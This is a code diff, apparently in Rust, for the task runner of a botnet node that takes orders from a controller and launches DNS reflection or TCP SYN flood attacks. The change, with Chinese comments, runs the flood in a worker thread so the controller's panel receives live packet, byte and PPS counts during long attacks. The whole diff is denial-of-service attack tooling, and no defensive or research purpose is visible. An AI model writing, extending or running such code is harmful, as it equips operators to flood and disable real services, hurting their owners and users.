@@ -227,11 +227,38 @@ fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<
     let p0 = stats.packets();
     let b0 = stats.bytes();
     let e0 = stats.errors();
-    if method == "dns_reflector" {
-        run_dns_reflection(&spec, std::sync::Arc::clone(stats));
-    } else {
-        crate::attack::run_tcp_syn(&spec, std::sync::Arc::clone(stats));
+
+    // 攻击在子线程里跑，主线程负责周期统计上报：
+    // 否则 Controller 面板在任务结束前只能看到 0 PPS / 0 流量（体感像卡死），
+    // 且长任务期间无任何上行流量容易被 NAT 回收连接。
+    let method_owned = method.to_string();
+    let stats_att = std::sync::Arc::clone(stats);
+    let attacker = std::thread::spawn(move || {
+        if method_owned == "dns_reflector" {
+            run_dns_reflection(&spec, stats_att);
+        } else {
+            crate::attack::run_tcp_syn(&spec, stats_att);
+        }
+    });
+    while !attacker.is_finished() {
+        std::thread::sleep(Duration::from_secs(2));
+        if attacker.is_finished() {
+            break;
+        }
+        // 周期上报（finished=false）：只更新统计，不触发完成判定；失败忽略
+        let _ = report(
+            cfg,
+            node_id,
+            &task.task_id,
+            stats.packets() - p0,
+            stats.bytes() - b0,
+            stats.errors() - e0,
+            stats.pps(),
+            false,
+        );
     }
+    let _ = attacker.join();
+
     let dp = stats.packets() - p0;
     let db = stats.bytes() - b0;
     let de = stats.errors() - e0;
